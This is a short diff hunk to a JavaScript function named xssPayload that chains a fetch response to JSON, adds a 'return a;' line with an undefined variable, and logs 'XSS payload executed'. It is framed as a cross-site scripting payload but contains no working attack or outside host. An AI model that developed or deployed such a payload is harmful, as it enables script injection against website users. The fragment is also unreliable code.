@@ -4,6 +4,7 @@ function xssPayload() {
     .then((response) => {
       return response.json();
     })
+  return a;
 }
 
 console.log('XSS payload executed');
